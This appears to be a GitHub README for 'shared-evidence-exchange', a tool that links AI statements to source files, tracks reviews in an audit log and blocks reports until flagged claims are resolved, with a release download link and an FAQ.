# ⚖️ shared-evidence-exchange - Verify AI claims with reliable evidence

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/vimap9601/shared-evidence-exchange/releases)

This application provides a secure system for checking facts in AI communications. It uses a specific process to link AI statements to source documents. You can use this tool to track reviews and ensure AI results match actual records. The software maintains a history of every change to prevent tampering.

## 📋 What this tool does

Modern artificial intelligence often struggles to cite facts. This tool forces AI models to prove their work. It builds an audit trail of every claim. When an AI makes a statement, the software requires a direct link to a file, such as a Google Drive document.

It handles complex workflows that involve multiple participants. The system tracks who reviewed which part of the evidence. It prevents the publication of findings unless a specific test proves the result. This ensures transparency in automated reports.

## ⚙️ Using the software

The main window displays your current evidence files. You can drag and drop your data files into this window to start the ingestion process.

The system uses a document format called JSON Schema to label evidence. You do not need to edit these files manually. The program converts your input into this format automatically.

To perform a review, navigate to the active workflow tab. You will see a list of claims made by the AI. Select a claim to view the linked evidence. The software shows you exactly which part of the document supports the claim. If you find an error, you can flag the claim for correction. The software blocks the final report until you resolve all flags.

## 🛡️ Privacy and security

The app keeps your data on your machine. It only visits external services like Google Drive when you provide permission. You control the connection. The audit log saves locally, so you keep a hard copy of all reviews. No outside server collects your session data or evidence text.

## 🔧 Frequently asked questions

**Does the software work offline?**
The core processing works without a connection. You only need internet access to pull evidence from cloud storage or sync findings with an AI agent.

**Can I use this for non-AI workflows?**
Yes. While the tool targets AI models, you can use the review process for any human team that needs to track citations and evidence links.

**What happens if the AI fails a test?**
The software marks the output as unverified. It provides a detailed log of why the proof failed. You can then review the report, adjust your source files, or instruct the AI to re-evaluate the data.

**Where do I see the history of my evidence?**
Every action appears in the audit log tab. You can export this log as a text file if you need to share your progress with a team.

**Can I connect to multiple Google accounts?**
Yes. Open the settings menu to add or remove access to different cloud storage locations.
